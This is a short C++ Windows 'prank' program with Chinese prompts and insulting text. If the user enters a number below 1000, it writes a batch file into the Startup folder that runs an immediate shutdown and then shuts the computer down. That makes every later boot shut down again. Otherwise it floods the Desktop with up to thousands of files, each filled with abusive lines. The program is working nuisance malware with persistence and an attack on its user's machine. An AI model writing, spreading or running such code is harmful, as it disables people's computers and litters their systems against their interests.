#include <iostream>
#include <windows.h>
#include <unistd.h>
#include <fstream>
#include <string>
#include <sstream>
using namespace std;
int main()
{
    cout << "本程序将做出整人的事情，输入 'y' 表示运行。如要运行,后果自负。" << endl;
    char ab;
    cin >> ab;
    if (ab == 'y')
    {
        cout << "请输入一个数字，不少于1000，否则关机，并让你的电脑再也不开机。" << endl;
        int a;
        cin >> a;
        if (a < 1000)
        {                                                
            ofstream o2;
            o2.open("C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\不让你开机.bat");
            o2 << "shutdown -s -t 0" << endl;
            system("shutdown -s -t 0");
        }
        if (a >= 1000)
        {
            cout << "您输入的数字将是本程序揍你电脑的强度！" << endl;
            Sleep(1000);
            ofstream out;
            for (int i = 1; i <= a; i++)
            {
                string res;
                stringstream ss;
                ss << i;
                ss >> res;
                //out.open("%USERPROFILE%\\Desktop\\A\\整你.你是狗(" + res + ")");
                out.open("C:\\Users\\Administrator\\Desktop\\整你.你是狗.你去死(" + res + ")");
                for (int k = 1; k <= 1000; k++)
                {
                    out << "你这头猪，别想删掉我" << endl;
                }
                out.close();
                cout << i << endl;
            }

        }
    }
    
}